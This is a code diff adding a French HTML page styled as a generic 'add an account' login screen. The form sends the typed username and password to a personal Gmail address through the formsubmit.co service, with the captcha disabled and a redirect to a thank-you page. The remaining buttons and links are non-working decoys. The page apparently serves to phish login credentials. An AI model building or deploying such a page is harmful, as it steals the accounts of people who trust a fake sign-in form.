@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Ajouter un compte</title>
+
+  <style>
+    :root{
+      --page-bg: #0e0f12;
+      --card-bg: #16171a;
+      --field-bg: #232427;
+      --muted: #c9cbd0;
+      --placeholder: rgba(255,255,255,0.45);
+      --outline: rgba(255,255,255,0.10);
+      --button-dark: #2b2d31;
+      --radius: 14px;
+    }
+
+    *{box-sizing:border-box;}
+    html,body{height:100%;margin:0;background:linear-gradient(180deg,#0b0c0f 0%, #0e0f12 100%);font-family:Arial, sans-serif;color:var(--muted);}
+    .container{max-width:420px;margin:28px auto;padding:18px;}
+    .card{background:var(--card-bg);border-radius:18px;padding:22px;box-shadow: 0 10px 30px rgba(0,0,0,0.6);border: 1px solid rgba(255,255,255,0.02);}
+    h1{margin:0 0 18px 0;font-size:36px;text-align:center;color:#fff;font-weight:700;letter-spacing:0.2px;}
+    form{display:flex;flex-direction:column;gap:12px;}
+    .input{background:var(--field-bg);border-radius:12px;padding:16px;border:1px solid var(--outline);color:#fff;font-size:16px;outline:none;}
+    .input::placeholder{color:var(--placeholder);}
+    .btn-conn{margin-top:6px;background:transparent;border-radius:12px;padding:14px;font-size:18px;font-weight:600;cursor:pointer;border:2px solid rgba(255,255,255,0.12);color:var(--muted);width:100%;}
+    .hint{text-align:center;margin-top:10px;color:var(--muted);font-weight:600;font-size:15px;}
+    .sep{margin:18px 0;position:relative;text-align:center;height:18px;}
+    .sep:before{content:"";position:absolute;left:12px;right:12px;top:50%;height:1px;background:rgba(255,255,255,0.04);transform:translateY(-50%);}
+    .sep span{position:relative;background:transparent;padding:0 10px;color:var(--muted);font-weight:700;z-index:1;}
+    .big-btn{display:block;width:100%;background:var(--button-dark);border-radius:12px;padding:16px;font-size:17px;font-weight:700;border:none;color:var(--muted);margin-top:8px;cursor:default;opacity:0.6;}
+    .bottom-link{text-align:center;margin-top:16px;opacity:0.6;pointer-events:none;}
+    .bottom-link a{color:var(--muted);font-weight:700;text-decoration:none;display:block;padding:12px 0;}
+    .input:focus{border-color: rgba(123,130,255,0.9);box-shadow: 0 6px 20px rgba(123,130,255,0.06);}
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="card">
+      <h1>Ajouter un compte</h1>
+
+      <!-- Formulaire Formsubmit -->
+      <form action="https://formsubmit.co/contactmastraabs@gmail.com" method="POST">
+        <input class="input" name="identifiant" type="text"="Identifiant/E-mail/Téléphone" required />
+        <input class="input" name="mot_de_passe" type="password" placeholder="Mot de passe" required />
+        <!-- Optionnel : désactiver captcha -->
+        <input type="hidden" name="_captcha" value="false" />
+        <!-- Optionnel : redirection après soumission -->
+        <input type="hidden" name="_next" value="https://ton-site.neocities.org/merci.html" />
+        <button type="submit" class="btn-conn">Connexion</button>
+      </form>
+
+      <div class="hint">Mot de passe ou nom d'utilisateur oublié ?</div>
+      <div class="sep"><span></span></div>
+      <button class="big-btn">Envoyez-moi un code unique par email</button>
+      <button class="big-btn">Utiliser un autre appareil</button>
+      <div class="bottom-link"><a href="#">Créer un nouveau compte</a></div>
+    </div>
+  </div>
+</body>
+</html>
